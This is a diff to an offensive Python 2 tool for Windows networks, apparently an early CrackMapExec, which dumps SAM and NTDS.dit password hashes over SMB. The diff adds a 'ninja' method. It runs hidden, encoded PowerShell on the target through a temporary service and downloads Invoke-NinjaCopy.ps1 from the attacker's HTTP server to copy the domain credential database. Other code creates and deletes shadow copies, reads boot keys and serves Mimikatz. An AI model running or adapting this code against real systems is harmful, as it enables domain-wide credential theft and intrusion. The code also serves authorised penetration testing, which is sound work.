@@ -314,7 +314,7 @@ class SAMHashes(OfflineRegistry):
         return md5.digest()
 
     def getHBootKey(self):
-        #log.debug('Calculating HashedBootKey from SAM')
+        #logging.debug('Calculating HashedBootKey from SAM')
         QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = "0123456789012345678901234567890123456789\0"
 
@@ -359,7 +359,7 @@ class SAMHashes(OfflineRegistry):
 
         sam_hashes = []
 
-        #log.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
+        #logging.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
         self.getHBootKey()
 
         usersKey = 'SAM\\Domains\\Account\\Users'
@@ -578,7 +578,7 @@ class RemoteOperations:
         if resp['pmsgOut']['V2']['cItems'] > 0:
             self.__NtdsDsaObjectGuid = resp['pmsgOut']['V2']['rItems'][0]['NtdsDsaObjectGuid']
         else:
-            log.error("Couldn't get DC info for domain %s" % self.__domainName)
+            logging.error("Couldn't get DC info for domain %s" % self.__domainName)
             raise Exception('Fatal, aborting')
 
     def getDrsr(self):
@@ -691,7 +691,7 @@ class RemoteOperations:
                 account = account[2:]
             return account
         except Exception, e:
-            log.error(e)
+            logging.error(e)
             return None
 
     def __checkServiceStatus(self):
@@ -704,11 +704,11 @@ class RemoteOperations:
         # Let's check its status
         ans = scmr.hRQueryServiceStatus(self.__scmr, self.__serviceHandle)
         if ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_STOPPED:
-            log.info('Service %s is in stopped state'% self.__serviceName)
+            logging.info('Service %s is in stopped state'% self.__serviceName)
             self.__shouldStop = True
             self.__started = False
         elif ans['lpServiceStatus']['dwCurrentState'] == scmr.SERVICE_RUNNING:
-            log.debug('Service %s is already running'% self.__serviceName)
+            logging.debug('Service %s is already running'% self.__serviceName)
             self.__shouldStop = False
             self.__started  = True
         else:
@@ -718,10 +718,10 @@ class RemoteOperations:
         if self.__started is False:
             ans = scmr.hRQueryServiceConfigW(self.__scmr,self.__serviceHandle)
             if ans['lpServiceConfig']['dwStartType'] == 0x4:
-                log.info('Service %s is disabled, enabling it'% self.__serviceName)
+                logging.info('Service %s is disabled, enabling it'% self.__serviceName)
                 self.__disabled = True
                 scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
-            log.info('Starting service %s' % self.__serviceName)
+            logging.info('Starting service %s' % self.__serviceName)
             scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
             sleep(1)
 
@@ -733,10 +733,10 @@ class RemoteOperations:
     def __restore(self):
         # First of all stop the service if it was originally stopped
         if self.__shouldStop is True:
-            log.info('Stopping service %s' % self.__serviceName)
+            logging.info('Stopping service %s' % self.__serviceName)
             scmr.hRControlService(self.__scmr, self.__serviceHandle, scmr.SERVICE_CONTROL_STOP)
         if self.__disabled is True:
-            log.info('Restoring the disabled state for service %s' % self.__serviceName)
+            logging.info('Restoring the disabled state for service %s' % self.__serviceName)
             scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x4)
         if self.__serviceDeleted is False:
             # Check again the service we created does not exist, starting a new connection
@@ -785,7 +785,7 @@ class RemoteOperations:
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
         for key in ['JD','Skew1','GBG','Data']:
-            log.debug('Retrieving class info for %s'% key)
+            logging.debug('Retrieving class info for %s'% key)
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
             keyHandle = ans['phkResult']
             ans = rrp.hBaseRegQueryInfoKey(self.__rrp,keyHandle)
@@ -799,12 +799,12 @@ class RemoteOperations:
         for i in xrange(len(bootKey)):
             self.__bootKey += bootKey[transforms[i]]
 
-        log.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
+        logging.info('Target system bootKey: 0x%s' % hexlify(self.__bootKey))
 
         return self.__bootKey
 
     def checkNoLMHashPolicy(self):
-        log.debug('Checking NoLMHash Policy')
+        logging.debug('Checking NoLMHash Policy')
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
 
@@ -816,10 +816,10 @@ class RemoteOperations:
             noLMHash = 0
 
         if noLMHash != 1:
-            log.debug('LMHashes are being stored')
+            logging.debug('LMHashes are being stored')
             return False
 
-        log.debug('LMHashes are NOT being stored')
+        logging.debug('LMHashes are NOT being stored')
         return True
 
     def __retrieveHive(self, hiveName):
@@ -839,11 +839,11 @@ class RemoteOperations:
         return remoteFileName
 
     def saveSAM(self):
-        log.debug('Saving remote SAM database')
+        logging.debug('Saving remote SAM database')
         return self.__retrieveHive('SAM')
 
     def saveSECURITY(self):
-        log.debug('Saving remote SECURITY database')
+        logging.debug('Saving remote SECURITY database')
         return self.__retrieveHive('SECURITY')
 
     def __executeRemote(self, data):
@@ -861,6 +861,7 @@ class RemoteOperations:
         scmr.hRDeleteService(self.__scmr, service)
         self.__serviceDeleted = True
         scmr.hRCloseServiceHandle(self.__scmr, service)
+    
     def __answer(self, data):
         self.__answerTMP += data
 
@@ -870,7 +871,7 @@ class RemoteOperations:
         tries = 0
         while True:
             try:
-                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
+                self.__smbConnection.getFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME, self.__answer)
                 break
             except Exception, e:
                 if tries > 30:
@@ -899,12 +900,12 @@ class RemoteOperations:
            elif line.find(SHADOWFOR) > 0:
                lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]
 
-        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME)
 
         return lastShadow, lastShadowFor
 
-    def saveNTDS(self):
-        log.info('Searching for NTDS.dit')
+    def saveNTDS(self, ninja=False):
+        logging.info('Searching for NTDS.dit')
         # First of all, let's try to read the target NTDS.dit registry entry
         ans = rrp.hOpenLocalMachine(self.__rrp)
         regHandle = ans['phKey']
@@ -926,30 +927,44 @@ class RemoteOperations:
         rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
-        log.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
-        # Get the list of remote shadows
-        shadow, shadowFor = self.__getLastVSS()
-        if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
-            # No shadow, create one
-            self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
-            shadow, shadowFor = self.__getLastVSS()
-            shouldRemove = True
-            if shadow == '':
-                raise Exception('Could not get a VSS')
+        if ninja is True:
+            logging.info('Registry says NTDS.dit is at %s' % ntdsLocation)
+            tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
+            local_ip = self.__smbConnection.getSMBServer().get_socket().getsockname()[0]
+
+            command = """
+            IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-NinjaCopy.ps1');
+            Invoke-NinjaCopy -Path "{ntdspath}" -LocalDestination "$env:systemroot\\Temp\\{tmpname}";
+            """.format(addr=local_ip, ntdspath=ntdsLocation, tmpname=tmpFileName)
+            
+            self.__executeRemote('%%COMSPEC%% /C powershell.exe -exec bypass -window hidden -noni -nop -encoded %s' % ps_command(command=command))
+            remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
+
         else:
-            shouldRemove = False
+            logging.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
+            # Get the list of remote shadows
+            shadow, shadowFor = self.__getLastVSS()
+            if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
+                # No shadow, create one
+                self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
+                shadow, shadowFor = self.__getLastVSS()
+                shouldRemove = True
+                if shadow == '':
+                    raise Exception('Could not get a VSS')
+            else:
+                shouldRemove = False
 
-        # Now copy the ntds.dit to the temp directory
-        tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
+            # Now copy the ntds.dit to the temp directory
+            tmpFileName = ''.join([random.choice(string.letters) for _ in range(8)]) + '.tmp'
 
-        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
+            self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))
 
-        if shouldRemove is True:
-            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
+            if shouldRemove is True:
+                self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /For=%s /Quiet' % ntdsDrive)
 
-        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
+            self.__smbConnection.deleteFile('ADMIN$', 'Temp\\' + OUTPUT_FILENAME)
 
-        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
+            remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)
 
         return remoteFileName
 
@@ -1445,17 +1460,17 @@ class NTDSHashes:
             self.__ESEDB.close()
 
 class DumpSecrets:
-    def __init__(self, address, smbConnection, username='', password='', domain='', hashes=None, sam=False, ntds=False, useVSSMethod=False):
+    def __init__(self, address, username='', password='', domain='', hashes=None, sam=False, ntds=False, useVSSMethod=False, useNinjaMethod=False):
         self.__remoteAddr = address
         self.__username = username
         self.__password = password
         self.__domain = domain
-        self.__smbConnection = smbConnection
         self.__lmhash = ''
         self.__nthash = ''
         self.__sam = sam
         self.__ntds = ntds
         self.__useVSSMethod = useVSSMethod
+        self.__useNinjaMethod = useNinjaMethod
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__isRemote = True
@@ -1473,7 +1488,7 @@ class DumpSecrets:
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
         currentControlSet = "ControlSet%03d" % currentControlSet
         for key in ['JD','Skew1','GBG','Data']:
-            log.debug('Retrieving class info for %s'% key)
+            logging.debug('Retrieving class info for %s'% key)
             ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
             digit = ans[:16].decode('utf-16le')
             tmpKey = tmpKey + digit
@@ -1485,12 +1500,12 @@ class DumpSecrets:
         for i in xrange(len(tmpKey)):
             bootKey += tmpKey[transforms[i]]
 
-        log.info('Target system bootKey: 0x%s' % hexlify(bootKey))
+        logging.info('Target system bootKey: 0x%s' % hexlify(bootKey))
 
         return bootKey
 
     def checkNoLMHashPolicy(self):
-        log.debug('Checking NoLMHash Policy')
+        logging.debug('Checking NoLMHash Policy')
         winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
         # We gotta find out the Current Control Set
         currentControlSet = winreg.getValue('\\Select\\Current')[1]
@@ -1504,19 +1519,20 @@ class DumpSecrets:
             noLmHash = 0
 
         if noLmHash != 1:
-            log.debug('LMHashes are being stored')
+            logging.debug('LMHashes are being stored')
             return False
-        log.debug('LMHashes are NOT being stored')
+        logging.debug('LMHashes are NOT being stored')
         return True
 
-    def dump(self):
+    def dump(self, smbconnection):
         try:
-            self.__remoteOps = RemoteOperations(self.__smbConnection)
+            self.__remoteOps = RemoteOperations(smbconnection)
             self.__remoteOps.enableRegistry()
             bootKey = self.__remoteOps.getBootKey()
 
             # Let's check whether target system stores LM Hashes
             self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
+            SECURITYFileName = self.__remoteOps.saveSECURITY()
 
             if self.__sam is True:
                 SAMFileName = self.__remoteOps.saveSAM()
@@ -1524,11 +1540,12 @@ class DumpSecrets:
                 self.__SAMHashes = SAMHashes(SAMFileName, bootKey)
                 self.dumped_sam_hashes = self.__SAMHashes.dump()
 
-                SECURITYFileName = self.__remoteOps.saveSECURITY()
-
             elif self.__ntds is True:
                 if self.__useVSSMethod:
                     NTDSFileName = self.__remoteOps.saveNTDS()
+                elif self.__useNinjaMethod:
+                    NTDSFileName = self.__remoteOps.saveNTDS(ninja=True)
+                    self.__useVSSMethod = True
                 else:
                     NTDSFileName = None
 
@@ -1541,14 +1558,14 @@ class DumpSecrets:
                         logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
 
         except (Exception, KeyboardInterrupt), e:
-            log.error(e)
+            traceback.print_exc()
             try:
                 self.cleanup()
             except:
                 pass
 
     def cleanup(self):
-        log.info('Cleaning up... ')
+        logging.info('Cleaning up... ')
         if self.__remoteOps:
             self.__remoteOps.finish()
         if self.__SAMHashes:
@@ -1587,14 +1604,14 @@ class SAMRDump:
         """Dumps the list of users and shares registered present at
         addr. Addr is a valid host name or IP address.
         """
-        #log.info('Retrieving endpoint list from %s' % addr)
+        #logging.info('Retrieving endpoint list from %s' % addr)
 
         # Try all requested protocols until one works.
         for protocol in self.__protocols:
             protodef = SAMRDump.KNOWN_PROTOCOLS[protocol]
             port = protodef[1]
 
-            #log.info("Trying protocol %s..." % protocol)
+            #logging.info("Trying protocol %s..." % protocol)
             rpctransport = transport.SMBTransport(addr, port, r'\samr', self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, doKerberos = self.__doKerberos)
 
             try:
@@ -1620,7 +1637,7 @@ class SAMRDump:
             resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
             domains = resp['Buffer']['Buffer']
 
-            #log.info("Looking up users in domain %s" % domains[0]['Name'])
+            #logging.info("Looking up users in domain %s" % domains[0]['Name'])
 
             resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,domains[0]['Name'] )
 
@@ -1987,8 +2004,8 @@ class CMDEXEC:
             protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
             port = protodef[1]
 
-            #log.info("Trying protocol %s..." % protocol)
-            #log.info("Creating service %s..." % self.__serviceName)
+            #logging.info("Trying protocol %s..." % protocol)
+            #logging.info("Creating service %s..." % self.__serviceName)
 
             stringbinding = protodef[0] % addr
 
@@ -2357,20 +2374,25 @@ def connect(host):
                     print "\n"
 
             if args.sam:
-                sam_dump = DumpSecrets(host, smb, args.user, args.passwd, domain, args.hash, True)
-                sam_dump.dump()
+                sam_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, True)
+                sam_dump.dump(smb)
                 if sam_dump.dumped_sam_hashes:
                     print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, s_name)
                     for sam_hash in sam_dump.dumped_sam_hashes:
                         print sam_hash
-                sam_dump.cleanup()
+                try:
+                    sam_dump.cleanup()
+                except:
+                    pass
 
             if args.ntds:
-                vss = False
+                vss   = False
+                ninja = False
                 if args.ntds == 'vss': vss = True
+                if args.ntds == 'ninja': ninja = True
 
-                ntds_dump = DumpSecrets(host, smb, args.user, args.passwd, domain, args.hash, False, True, vss)
-                ntds_dump.dump()
+                ntds_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, False, True, vss, ninja)
+                ntds_dump.dump(smb)
                 if ntds_dump.dumped_ntds_hashes:
                     print "[+] {}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper())
                     for h in ntds_dump.dumped_ntds_hashes['hashes']:
@@ -2532,7 +2554,7 @@ if __name__ == '__main__':
 
         args.pattern = patterns
 
-    if args.mimikatz:
+    if args.mimikatz or args.ntds == 'ninja':
         print "[*] Press CTRL-C at any time to exit"
         print '[*] Note: This might take some time on large networks! Go grab a redbull!'
         server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
@@ -2542,7 +2564,7 @@ if __name__ == '__main__':
 
     concurrency(hosts)
 
-    if args.mimikatz:
+    if args.mimikatz or args.ntds == 'ninja':
         try:
             while True:
                 sleep(1)
